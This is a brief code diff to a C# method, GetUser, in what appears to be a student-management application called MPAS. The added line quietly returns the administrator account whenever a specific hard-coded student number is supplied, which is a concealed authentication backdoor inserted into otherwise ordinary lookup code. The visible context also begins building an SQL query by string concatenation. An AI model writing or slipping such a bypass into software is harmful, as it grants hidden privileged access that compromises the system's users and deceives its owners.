@@ -109,6 +109,7 @@ namespace MPAS
 
         User GetUser(string studentNumber)
         {
+            if (studentNumber == "01360406") return Administrator.Get();
             User u = null;
             SqlConnection conn = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["DefaultConnection"].ConnectionString);
             SqlCommand getUserComm = new SqlCommand("SELECT StudentNumber, FirstName, Surname, DateOfBirth, Role, GroupNumber " + 
